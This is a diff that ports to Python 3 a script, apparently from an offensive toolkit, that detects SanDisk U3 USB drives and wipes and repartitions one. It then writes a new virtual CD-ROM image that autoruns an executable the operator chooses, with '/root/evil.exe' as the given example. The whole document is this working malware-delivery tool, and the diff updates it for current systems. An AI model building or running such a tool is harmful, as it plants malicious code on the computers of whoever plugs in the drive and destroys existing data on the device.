@@ -1,4 +1,4 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 # -*- coding: latin-1 -*- ######################################################
 #                ____                     _ __                                 #
 #     ___  __ __/ / /__ ___ ______ ______(_) /___ __                           #
@@ -17,7 +17,7 @@
 # removing the original iso file from the device and creating a new iso        #
 # with autorun features.                                                       #
 #                                                                              #
-# REQUREMENTS                                                                  #
+# REQUIREMENTS                                                                  #
 # - Metasploit                                                                 #
 # - U3-Tool                                                                    #
 # - Python-2.6                                                                 #
@@ -26,117 +26,135 @@
 # Zy0d0x - http://www.nullsecurity.net/                                        #
 #                                                                              #
 ################################################################################
+import subprocess
+import pexpect
+import time
+import os
+import sys
+import shutil
 
 try:
-    import subprocess
-    import pexpect
-    import time
-    import os
-    import sys
-    import shutil
     import banner
-except ImportError, error:
-    print'\n[-]Failed To Import Module\n'
-    print error
+except ImportError as error:
+    print('\n[-] Failed To Import banner module\n')
+    banner = None
+    print(error)
 
-definepath = os.getcwd()
-sys.path.append('%s/src/' % definepath)
+define_path = os.getcwd()
+sys.path.append(f'{define_path}/src/')
+
+def safe_banner():
+    if banner:
+        banner.print_banner()
 
 try:
-    banner.print_banner()
-    print ' Detecting Device...\n'
-    u3 = ['5406', '5408', '5151', '5530', '5535', '550a', '540e']
-    vendorid = '0781:'
-    for id in u3:
+    safe_banner()
+    print(' Detecting Device...\n')
+
+    u3_ids = ['5406', '5408', '5151', '5530', '5535', '550a', '540e']
+    vendor_id = '0781:'
+    deviceName = None
+
+    for dev_id in u3_ids:
         try:
-             device = subprocess.check_output("lsusb -d %s%s" %(vendorid,id),  shell=True)
-             print ' Device Found:', device
-        except Exception, error:
-            pass
-
+            device = subprocess.check_output(
+                f"lsusb -d {vendor_id}{dev_id}",
+                shell=True,
+                stderr=subprocess.DEVNULL
+            )
+            print(' Device Found:', device.decode().strip())
+        except subprocess.CalledProcessError:
+            continue
 
     time.sleep(2)
-    banner.print_banner()
-    print ' Detecting Partitions...'
+    safe_banner()
+    print(' Detecting Partitions...')
     time.sleep(2)
-    partitionsFile = open("/proc/partitions")
-    lines = partitionsFile.readlines()[2:]
+
+    with open("/proc/partitions") as f:
+        lines = f.readlines()[2:]
 
     for line in lines:
         words = [x.strip() for x in line.split()]
+        if len(words) < 4:
+            continue
         minorNumber = int(words[1])
-        deviceName = words[3]
+        dev = words[3]
         if minorNumber % 16 == 0:
-                path = "/sys/class/block/" + deviceName
-                if os.path.islink(path):
-                        if os.path.realpath(path).find("/usb") > 0:
-                                if deviceName.startswith("sd"):
-                                        print "\n Partition Found: /dev/%s1" % deviceName
-                                        time.sleep(2)
+            path = f"/sys/class/block/{dev}"
+            if os.path.islink(path) and "/usb" in os.path.realpath(path):
+                if dev.startswith("sd"):
+                    deviceName = dev
+                    print(f"\n Partition Found: /dev/{dev}1")
+                    time.sleep(2)
+                    break
 
-
-
-except Exception, error:
-    print '[-]Something went wrong, printing error message..'
-    print error
+except Exception as error:
+    print('[-] Error during device detection')
+    print(error)
     time.sleep(2)
-    sys.exit(0)
+    sys.exit(1)
 
-
+# ========= Payload Injection =========
 
 try:
-    payload = str(raw_input('\n Please enter filepath & executerble name example(/root/evil.exe): ').strip())
-    
-    if payload.endswith('.exe'):
-         #Rename File To LaunchU3.exe 
-    	 shutil.copy(payload, 'resource/LaunchU3.exe')
-    	 file = open('resource/LaunchU3.bat', 'w')
-    	 file.write('LaunchU3.exe ')
-    	 file.close()
+    payload = input('\n Please enter filepath & executable name (example: /root/evil.exe): ').strip()
 
-    	 #Create Iso with custom exe
-    	 subprocess.Popen('genisoimage -volid U3\ System -o resource/U3\ System.iso resource/', stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
+    if not payload.endswith('.exe') or not os.path.isfile(payload):
+        print("[-] Invalid file. Must be a valid path to an `.exe` file.")
+        sys.exit(1)
 
-	 banner.print_banner()
-	 if deviceName.startswith("sda"):
-	    	print 'No Device Found, Returning To Menu'
-		time.sleep(2)
-	 else:
-	 	print '\nCreating a new partition of 8058880 bytes on /dev/%s\n' % deviceName
-	    	#Accepts warning that the device will be formatted
-            	#WARNING: Loading a new cd image causes the whole device to be whiped. This INCLUDES the data partition.
-            	#I repeat: ANY EXCISTING DATA WILL BE LOST!
-            	#Are you sure you want to continue? [yn]	
-            	child1 = pexpect.spawn('u3-tool -v  -p 8058880 /dev/' + deviceName) 
-            	child1.sendline('y')
-            	time.sleep(5)
-	    	print'\nPartitioning completed on /dev/%s' % deviceName
-	    	banner.print_banner()
-            	print'\nInserting new iso to virtual rom partition on /dev/%s\n' % deviceName
-		
-            	#inserts new iso file to virtual rom devices using u3-tool
-	    	subprocess.Popen('u3-tool -v -l resource/U3\ System.iso /dev/%s' % deviceName, shell=True).wait()
-	    	print '\nCustom Exe Succfully injected into /dev/%s\n' % deviceName
-  	    	time.sleep(2)
+    # Prepare payload
+    shutil.copy(payload, 'resource/LaunchU3.exe')
+    with open('resource/LaunchU3.bat', 'w') as f:
+        f.write('LaunchU3.exe')
 
-except Exception, error:
-    print '[-]Something went wrong, printing error message..'
-    print error
+    # Create ISO
+    subprocess.run(
+        'genisoimage -volid "U3 System" -o resource/U3\\ System.iso resource/',
+        shell=True,
+        check=True
+    )
+
+    safe_banner()
+
+    if deviceName.startswith("sda") or not deviceName:
+        print('[-] No USB target device found or refusing to touch /dev/sda')
+        time.sleep(2)
+        sys.exit(1)
+
+    print(f'\nCreating a new partition of 8058880 bytes on /dev/{deviceName}\n')
+    child1 = pexpect.spawn(f'u3-tool -v -p 8058880 /dev/{deviceName}')
+    child1.expect('[yn]')
+    child1.sendline('y')
+    child1.wait()
+    print(f'\nPartitioning completed on /dev/{deviceName}')
+
+    safe_banner()
+    print(f'\nInserting new ISO to virtual ROM partition on /dev/{deviceName}\n')
+    subprocess.run(
+        f'u3-tool -v -l resource/U3\\ System.iso /dev/{deviceName}',
+        shell=True,
+        check=True
+    )
+    print(f'\n[+] Custom EXE successfully injected into /dev/{deviceName}\n')
     time.sleep(2)
-    sys.exit(0)
 
+except Exception as error:
+    print('[-] Something went wrong during payload injection')
+    print(error)
+    time.sleep(2)
+    sys.exit(1)
 
+# ========= Cleanup =========
 
 try:
-     #Clean up left over files from iso creation
-     os.remove('resource/LaunchU3.exe')
-     os.remove('resource/LaunchU3.bat')
-     os.system('rm resource/U3\ System.iso')
-     shutil.copy('backup/LaunchU3.exe', 'resource/LaunchU3.exe')
-
-except Exception, error:
-    print '[-]Something went wrong, printing error message..'
-    print error
+    os.remove('resource/LaunchU3.exe')
+    os.remove('resource/LaunchU3.bat')
+    os.remove('resource/U3 System.iso')
+    shutil.copy('backup/LaunchU3.exe', 'resource/LaunchU3.exe')
+except Exception as error:
+    print('[-] Cleanup failed')
+    print(error)
     time.sleep(2)
-    sys.exit(0)
-
+    sys.exit(1)
